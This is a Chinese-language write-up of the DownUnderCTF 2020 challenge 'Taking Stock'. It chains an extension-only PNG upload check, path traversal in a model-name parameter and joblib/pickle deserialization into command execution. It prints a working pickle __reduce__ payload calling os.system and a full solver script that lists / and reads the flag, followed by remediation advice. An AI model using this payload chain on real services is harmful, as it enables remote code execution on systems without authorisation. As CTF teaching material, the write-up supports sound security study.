# DownUnderCTF 2020 - Taking Stock

## 题目简述

应用提供股票线性回归预测和 PNG 头像上传。解题不依赖模型输出：上传接口只检查原始文件名的 `.png` 后缀，却把任意内容保存到可预测的 `/tmp/<uuid>.png`；预测接口又允许 `stock` 目录穿越，并把目标文件交给 `joblib.load()`。构造带 `__reduce__` 的序列化对象即可在反序列化时执行命令。

## 解题过程

登录会话会分配 UUID，头像路径固定为：

```python
def get_user_img_path():
    return os.path.join('/tmp', f'{session["id"]}.png')
```

头像接口仅检查客户端文件名的扩展名，不检查 MIME、文件签名或解码结果：

```python
if img and allowed_file(img.filename):
    img.save(get_user_img_path())
```

访问尚不存在的头像时，404 响应还会回显完整服务器路径。UUID 可以从 `/me` 中的头像 URL读取，也可以从 Flask session 的未签名数据段读取；不需要伪造签名。

预测接口的 `stock` 参数直接拼到模型根目录：

```python
model_path = os.path.join('./models', request.form.get('stock', 'GOOGL'))
model = joblib.load(model_path)
```

由于没有规范化后检查路径仍位于 `MODEL_ROOT`，传入多层 `../` 可令 `joblib.load` 打开上传到 `/tmp` 的文件。Joblib 底层使用 pickle 语义；下面的对象在加载时会调用 `os.system(command)`：

```python
import io
import joblib
import os

class Payload:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return os.system, (self.command,)

buf = io.BytesIO()
joblib.dump(Payload("id > /tmp/<uuid>.png"), buf)
buf.seek(0)
```

把这段 joblib 数据作为文件 `payload.png` 上传，服务端只看文件名，因此接受并保存。随后触发目录穿越：

```python
session.post(
    f"{base}/predict",
    data={
        "stock": "../../../../../../tmp/<uuid>.png",
        "prices": "1,2",
    },
)
```

反序列化时命令执行，输出又覆盖同一个头像文件；通过 `/profile-picture/<uuid>` 即可读取。容器把 flag 复制成根目录下的随机文件名，所以官方 solver 先执行 `ls /`，找出以 `flag` 开头的文件，再读取它：

```python
def exec_cmd(command):
    payload = io.BytesIO()
    joblib.dump(
        Payload(f"{command} > /tmp/{uid}.png"),
        payload,
    )
    payload.seek(0)

    session.post(
        f"{base}/profile-picture",
        files={"img": ("payload.png", payload)},
    )
    session.post(
        f"{base}/predict",
        data={
            "stock": "../" * 16 + f"/tmp/{uid}.png",
            "prices": "1,2",
        },
    )
    return session.get(f"{base}/profile-picture/{uid}").text

flag_name = next(name for name in exec_cmd("ls /").splitlines()
                 if name.startswith("flag"))
print(exec_cmd(f"cat /{flag_name}"))
```

输出为：

```text
DUCTF{1n_A_bIT_0f_a_piCKl3_fd5ab3e4}
```

未知 joblib/pickle 文件可能执行代码，分析附件时不应在宿主机上直接加载。本题虽然以 AI 服务为外壳，但模型预测行为与答案无关，决定性问题是 Web 路径控制和不安全反序列化，因此归入 Web。

## 方法总结

利用链需要三个缺陷共同成立：仅按扩展名接受任意字节、上传路径可定位、模型选择允许越过根目录并进入 `joblib.load`。修复时应真正解码并重编码图片、用固定白名单映射模型名、解析规范路径并校验其位于模型目录内，同时永远不要对用户可控文件使用 pickle/joblib 反序列化。
